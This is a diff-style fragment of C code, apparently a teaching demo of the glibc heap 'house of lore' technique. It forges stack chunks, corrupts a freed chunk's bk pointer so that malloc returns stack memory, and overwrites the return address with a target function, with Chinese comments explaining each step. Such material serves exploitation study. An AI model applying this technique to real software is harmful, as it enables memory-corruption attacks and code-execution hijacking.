@@ -1,0 +1,30 @@
+35  intptr_t* stack_buffer_1[4] = {0};
+36  intptr_t* stack_buffer_2[3] = {0};
+37  void* fake_freelist[7][4];
+44  intptr_t *victim = malloc(0x100);
+48  void *dummies[7];
+49  for(int i=0; i<7; i++) dummies[i] = malloc(0x100);
+52  intptr_t *victim_chunk = victim-2;
+58  for(int i=0; i<6; i++) {
+59    fake_freelist[i][3] = fake_freelist[i+1];
+60  }
+61  fake_freelist[6][3] = NULL;
+67  stack_buffer_1[0] = 0;
+68  stack_buffer_1[1] = 0;
+69  stack_buffer_1[2] = victim_chunk;
+74  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
+75  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
+79  stack_buffer_2[3] = (intptr_t *)fake_freelist[0];
+83  void *p5 = malloc(1000);
+88  for(int i=0; i<7; i++) free(dummies[i]);
+90  free((void*)victim);
+99  void *p2 = malloc(1200);
+110 victim[1] = (intptr_t)stack_buffer_1;
+114 for(int i=0; i<7; i++) malloc(0x100);
+120 void *p3 = malloc(0x100);
+// 向分配到的地址写数据，会写入栈中
+123 char *p4 = malloc(0x100);
+130 intptr_t sc = (intptr_t)jackpot;
+// 再通过其它方法，知道返回地址相对于p4的偏移，就可以将shellcode地址，覆盖为返回地址
+132 long offset = (long)__builtin_frame_address(0) - (long)p4;
+133 memcpy((p4+offset+8), &sc, 8);
